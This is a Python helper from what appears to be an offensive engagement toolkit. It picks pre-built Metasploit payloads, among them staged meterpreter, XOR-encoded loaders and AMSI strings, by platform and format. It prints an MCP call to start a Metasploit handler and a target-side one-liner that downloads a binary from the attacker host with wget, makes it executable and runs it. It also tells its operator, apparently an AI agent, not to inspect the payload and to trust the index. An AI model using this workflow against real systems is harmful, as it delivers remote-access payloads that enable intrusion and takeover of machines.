#!/usr/bin/env python3
"""Look up a pre-generated payload by platform/arch/format.

Reads `engagement/payloads/index.json` (built by gen_payloads.sh) and
returns the best match. Prints a compact one-line result suitable for
pasting into a `send_command` payload-delivery step, PLUS the
`start_handler` call the teammate should run first.

Usage:
  python3 tools/preflight/pick.py --platform windows --arch x64 --format exe
  python3 tools/preflight/pick.py --name linux-x64-meterpreter-staged
  python3 tools/preflight/pick.py --list

Exit codes: 0 = exactly one match; 1 = none; 2 = multiple (prints all).
"""

from __future__ import annotations

import argparse
import json
import sys
from pathlib import Path


_INDEX = Path(__file__).resolve().parent.parent.parent / "engagement" / "payloads" / "index.json"


def _load() -> list[dict]:
    if not _INDEX.exists():
        print(f"ERROR: {_INDEX} not found. Run tools/preflight/gen_payloads.sh --lhost <ip-or-iface> first.",
              file=sys.stderr)
        sys.exit(2)
    try:
        return json.loads(_INDEX.read_text())
    except json.JSONDecodeError as e:
        print(f"ERROR: index.json corrupt: {e}", file=sys.stderr)
        sys.exit(2)


def _print(entry: dict) -> None:
    print(f"name:       {entry['name']}")
    print(f"path:       {entry['path']}")
    print(f"size:       {entry['size']} bytes   sha256: {entry['sha256'][:16]}…")
    print(f"payload:    {entry['payload']}")
    print(f"callback:   {entry['callback']}  (LPORT {entry['lport']})")
    print(f"handler:    {entry['handler_module']}")
    enc = entry.get("encoding") or "none"
    if enc != "none":
        print(f"encoding:   {enc}   (self-decoding loader — deliver as-is)")
    print()
    print("NOTE: do NOT Read/cat/less this file — binary artifact "
          "(raw shellcode / XOR loader / AMSI strings). Trust the index.")
    print()
    print("Start the handler first (metasploit-server MCP):")
    lhost, lport = entry["callback"].rsplit(":", 1)
    print(
        f'  mcp__metasploit-server__start_handler('
        f'payload="{entry["payload"]}", lhost="{lhost}", lport={lport})'
    )
    print()
    print("Then deliver the binary to the target (choose transport that fits):")
    print(f"  python3 -m http.server 8000 --directory engagement/payloads &  # one-liner")
    print(f"  # on target: wget http://{lhost}:8000/{Path(entry['path']).name} -O /tmp/x && chmod +x /tmp/x && /tmp/x")


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__.split("\n")[0])
    ap.add_argument("--name", help="exact name (overrides filters)")
    ap.add_argument("--platform", help="windows | linux | python | php | java")
    ap.add_argument("--arch", help="x64 | x86")
    ap.add_argument("--format", dest="fmt", help="exe | elf | raw | war | aspx")
    ap.add_argument("--list", action="store_true",
                    help="list all entries and exit")
    args = ap.parse_args()

    entries = _load()
    if args.list:
        for e in entries:
            print(f"  {e['name']:36}  {e['platform']:8} {e['arch']:5} {e['format']:5} "
                  f"LPORT={e['lport']}  {Path(e['path']).name}")
        return 0

    hits = entries
    if args.name:
        hits = [e for e in hits if e["name"] == args.name]
    if args.platform:
        hits = [e for e in hits if e["platform"] == args.platform]
    if args.arch:
        hits = [e for e in hits if e["arch"] == args.arch]
    if args.fmt:
        hits = [e for e in hits if e["format"] == args.fmt]

    if not hits:
        print("MISS: no payload matches those filters. Try `--list` to see what's "
              "available or re-run gen_payloads.sh to extend the matrix.",
              file=sys.stderr)
        return 1
    if len(hits) > 1:
        print(f"MULTI: {len(hits)} entries match. Narrow with more filters:")
        for e in hits:
            print(f"  {e['name']:36}  {e['platform']:8} {e['arch']:5} {e['format']:5} LPORT={e['lport']}")
        return 2
    _print(hits[0])
    return 0


if __name__ == "__main__":
    sys.exit(main())
